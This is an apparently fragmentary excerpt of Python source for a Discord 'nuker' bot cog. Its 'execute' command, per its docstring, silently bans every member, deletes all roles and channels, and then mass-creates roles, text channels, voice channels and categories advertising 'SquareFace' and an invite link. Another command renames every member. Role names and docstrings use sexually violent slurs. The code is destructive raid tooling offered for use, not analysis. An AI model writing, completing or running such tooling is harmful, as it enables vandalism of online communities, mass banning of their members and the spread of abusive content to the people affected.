...
class nukes(commands.Cog):
    """All hail SquareFace we will bring the commoners to their knees"""
        ...
        for i in range(1, 25):
            try:
                await ctx.guild.create_role(
                    name=f"RAPED BY SquareFace https://discord.gg/t66k5ekyG9{i}"
                )
                print(
                    f"{Fore.GREEN}[-]ROLE > {Fore.RESET}Made role:  RAPED BY SquareFace https://discord.gg/t66k5ekyG9{i}"
                )
            except:
        ...
        for i in range(1, 25):
            try:
                await ctx.guild.create_text_channel(
                    name=f"NUKED-BY-SquareFace-{i}-https://daddie.xyz"
                )
                print(
                    f"{Fore.GREEN}[-]CHANNEL > {Fore.RESET}Made text channel:  NUKED-BY-SquareFace-{i}-https://daddie.xyz"
                )
                await ctx.guild.create_voice_channel(
                    name=f"NUKED BY SquareFace {i} https://discord.gg/t66k5ekyG9"
                )
                print(
                    f"{Fore.GREEN}[-]CHANNEL > {Fore.RESET}Made voice channel:  NUKED BY SquareFace {i} https://discord.gg/t66k5ekyG9"
                )
                await ctx.guild.create_category(
                    name=f"NUKED BY SquareFace {i} https://discord.gg/t66k5ekyG9"
                )
                print(
                    f"{Fore.RED}[-]CHANNEl > {Fore.RESET}Made category: NUKED BY SquareFace {i} https://discord.gg/t66k5ekyG9"
                )
            except:
    ...
    async def execute(self, ctx):
        """Nukes the fucking shit outta the server banning everyone silently. While no one notices\nNext up it deletes all roles  then creates SquareFace roles\nThen it deletes all channels possible to then make SquareFace channels"""
        await ctx.message.delete()
        ...
        for i in range(1, 50):
            try:
                await ctx.guild.create_role(
                    name=f"NUKED BY SquareFace https://discord.gg/t66k5ekyG9 {i}"
                )
                print(
                    f"{Fore.RED}[-]ROLE > {Fore.RESET}Made role NUKED BY SquareFace https://discord.gg/t66k5ekyG9 {i}"
                )
            except Exception as e:
        ...
        for i in range(1, 25):
            try:
                ...
                print(
                    f"{Fore.RED}[-]CHANNEL > {Fore.RESET}Made text channel! NUKED-BY-SquareFace-{i}-https://daddie.xyz"
                )
                await ctx.guild.create_voice_channel(
                    name=f"NUKED BY SquareFace {i} https://discord.gg/t66k5ekyG9"
                )
                print(
                    f"{Fore.RED}[-]CHANNEL > {Fore.RESET}Made voice channel! NUKED BY SquareFace {i} https://discord.gg/t66k5ekyG9"
                )
                await ctx.guild.create_category(
                    name=f"NUKED BY SquareFace {i} https://discord.gg/t66k5ekyG9"
                )
    ...
    async def undoreall(self, ctx):
        """Renames every member in the server to raped by SquareFace"""
        await ctx.delete()
        rename_to = ""
        i = 0
